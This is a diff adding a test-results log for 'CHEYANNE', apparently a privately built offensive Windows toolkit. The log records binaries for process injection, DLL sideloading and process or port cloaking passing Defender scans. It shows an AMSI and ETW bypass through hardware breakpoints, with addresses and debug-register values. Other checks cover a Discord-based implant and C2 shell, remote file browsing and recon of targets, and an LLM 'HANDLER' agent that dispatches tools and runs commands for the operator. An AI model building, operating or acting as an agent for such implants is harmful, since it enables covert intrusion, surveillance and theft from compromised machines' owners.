@@ -1,0 +1,123 @@
+  ╔══════════════════════════════════════════════════╗
+  ║  CHEYANNE — Full Verification Suite              ║
+  ║  20260623_055134                                ║
+  ╚══════════════════════════════════════════════════╝
+  Log: C:\Users\gwu07\Desktop\cheyanne\TEST_RESULTS_20260623_055134.txt
+
+  ═══ TEST 1-5: PHASE 1 — BUILD ═══
+  [PASS] #1 Binary exists: dark_room — dark_room/dark_room.exe
+  [PASS] #1 Binary exists: shell — shell/vader_shell.exe
+  [PASS] #1 Binary exists: inject_exe — injection/vader_inject.exe
+  [PASS] #1 Binary exists: inject_dll — injection/vader_inject.dll
+  [PASS] #1 Binary exists: svc_replace — sideload/svc_replace.exe
+  [PASS] #1 Binary exists: dll_proxy — sideload/version_v6_stealth.c
+  [PASS] #1 Binary exists: cloak_dll — cloak/bin/cloak.dll
+  [PASS] #1 Binary exists: cloak_loader — cloak/bin/cloak_loader.exe
+  [PASS] #2 Build count — 8/8 core binaries
+      dark_room: 0xC7
+      shell: 0xB6
+      inject: 0xCD
+  [PASS] #3 XOR keys present — 3 keys found
+  [PASS] #4 Defender available — C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2605
+      dark_room/dark_room.exe: CLEAN
+      shell/vader_shell.exe: CLEAN
+      cloak/bin/cloak.dll: CLEAN
+  [PASS] #5 Quick scan — 3/3 clean
+
+  ═══ TEST 6-9: PHASE 2 — STEALTH ═══
+  [PASS] #6 Dark Room binary exists
+    [*] Launching dark_room.exe --test ...
+    --- PHASE 1: LOCATE TARGETS ---
+
+  [+] AmsiScanBuffer at 0x00007FF9C1A28160
+  [+] EtwEventWrite  at 0x00007FF9DE300430
+
+  --- PHASE 2: ACTIVATE DARK ROOM ---
+
+  [+] Unified VEH handler registered
+  [+] DR0 = 0x00007FF9C1A28160 (AmsiScanBuffer)
+  [+] DR1 = 0x00007FF9DE300430 (EtwEventWrite)
+  [+] DR7 = 0x405
+
+  [+] DARK ROOM ACTIVE
+  [+] Script scanning: BLIND (AMSI)
+  [+] Process telemetry: BLIND (ETW)
+  [+] Memory integrity: CLEAN (zero modifications)
+
+  --- PHASE 3: VERIFY ---
+
+  [*] Testing
+  [PASS] #7 AMSI BLIND — AMSI bypass via HWBP DR0
+  [PASS] #8 ETW BLIND — ETW bypass via HWBP DR1
+  [PASS] #9 Cloak binaries — dll=YES loader=YES
+
+    ▶ HUMAN CHECK #10: Cloak test
+    Menu [8] Test Cloak — process count drops? port 4443 hidden? Unhook restores?
+  [PASS] #10 Cloak test
+
+  ═══ TEST 11-14: PHASE 3 — DEPLOY ═══
+  [PASS] #11 Port 4443 free — ready for C2
+  [PASS] #12 Discord implant built — 9,432,530 bytes
+
+    ▶ HUMAN CHECK #13: C2 Shell launch
+    Menu [D] → TCP :4443 + Discord poller starts? No port conflict error?
+  [PASS] #13 C2 Shell launch
+
+    ▶ HUMAN CHECK #14: Radon connects
+    Radon shell appears? Type 'sessions' in chey> — see TCP + Discord sessions?
+  [PASS] #14 Radon connects
+
+  ═══ TEST 15-20: PHASE 4 — OPERATE ═══
+  [PASS] #15 cheyanne_ops loads
+  [PASS] #16 Discord config — webhook=YES token=YES channel=1518584455411925193
+  [FAIL] #17 Live sessions — 0 — deploy implant first
+
+    ▶ HUMAN CHECK #18: Screenshot [T]
+    Menu [T] → BMP downloads? Converts to PNG? Opens in explorer? Shows Radon desktop?
+  [FAIL] #18 Screenshot [T] — dont now
+
+    ▶ HUMAN CHECK #19: Browse [L]
+    Menu [L] → type C:\Users → listing appears from target?
+  [PASS] #19 Browse [L]
+
+    ▶ HUMAN CHECK #20: Recon [N]
+    Menu [N] → full system info from target? hostname, user, IP, processes?
+  [FAIL] #20 Recon [N] — 
+
+  ═══ TEST 21-22: HANDLER AI AGENT ═══
+  [PASS] #21 Agent script exists
+
+    ▶ Testing HANDLER with automated query...
+    âš¡ list_sessions()
+TOOL_TEST: No active sessions.
+    âš¡ local_command(command=whoami)
+LOCAL_CMD: laptop-r32m8mli\gwu07
+OLLAMA: connected to http://192.168.1.92:11434
+  [PASS] #22a Tool dispatch works
+  [PASS] #22b Local command works — laptop-r32m8mli\gwu07
+OLLAMA: connected 
+  [PASS] #22c Ollama connected
+
+    ▶ HUMAN CHECK #23: HANDLER chat test
+    Menu [H] → type 'list sessions' → does it fire tools (⚡ markers)? Type 'exit' to quit.
+  [FAIL] #23 HANDLER chat test — SLOW
+
+  ═══ TEST 24-26: EXTRAS ═══
+  [PASS] #24 ROADMAP exists
+  [PASS] #25 Docs complete — BUILD_FROM_ASHES + CODE_WALKTHROUGH + VADER_MANUAL + evc.html
+  [PASS] #26 Encrypted backup exists — 3 backup(s), latest: cheyanne-FULL-20260623c.7z
+
+  ══════════════════════════════════════════════════════
+    RESULTS SUMMARY
+  ══════════════════════════════════════════════════════
+
+    PASS: 31    FAIL: 4    SKIP: 0    TOTAL: 35
+
+    FAILURES:
+    #17 Live sessions: 0 — deploy implant first
+    #18 Screenshot [T]: dont now
+    #20 Recon [N]: 
+    #23 HANDLER chat test: SLOW
+
+    Full log: C:\Users\gwu07\Desktop\cheyanne\TEST_RESULTS_20260623_055134.txt
+    Timestamp: 20260623_055134
